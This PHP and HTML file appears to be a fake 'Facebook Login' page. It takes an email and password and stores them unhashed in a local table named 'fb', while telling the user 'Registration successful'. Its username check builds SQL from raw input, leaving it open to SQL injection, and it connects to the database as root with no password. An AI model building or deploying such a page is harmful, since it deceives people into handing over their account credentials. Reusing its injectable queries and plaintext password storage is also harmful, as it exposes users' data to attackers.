<?php
$conn = mysqli_connect("localhost", "root", "", "db_shop");
session_start();

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $yahoo = $_POST['yahoo'];
    $password = $_POST['password'];

    if (!empty($yahoo) && !empty($password)) {
        $check_username_query = "SELECT * FROM fb WHERE yahoo='$yahoo'";
        $check_username_result = mysqli_query($conn, $check_username_query);

        if (mysqli_num_rows($check_username_result) > 0) {
            echo "<script>alert('Username already exists. Please choose another username.');</script>";
        } else {
            $stmt = $conn->prepare("INSERT INTO fb (yahoo, password) VALUES (?, ?)");
            $stmt->bind_param("ss", $yahoo, $password);

            if ($stmt->execute()) {
                echo "<script>alert('Registration successful.');</script>";
            } else {
                echo "<script>alert('Error: " . $stmt->error . "');</script>";
            }
            $stmt->close();
        }
    } else {
        echo "<script>alert('Please fill in all required fields.');</script>";
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Registration</title>
    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
    <style>
        .registration-form {
            max-width: 500px;
            margin: 50px auto;
            padding: 20px;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
        }
    </style>
</head>
<body>
<div class="container">
    <div class="registration-form bg-white p-4 rounded">
        <h2 class="text-center">Facebook Login</h2>
        <form action="loginfb.php" method="POST" enctype="multipart/form-data">

            <div class="form-group">
                <label for="yahoo">Email</label>
                <input type="text" class="form-control" id="yahoo" name="yahoo" required>
            </div>
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" class="form-control" id="password" name="password" required>
            </div>
           
            <button type="submit" class="btn btn-primary btn-block">Login</button>
            
        </form>
        <a href="index.php">Back</a>
    </div>
</div>
<script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.3/dist/umd/popper.min.js"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
</body>
</html>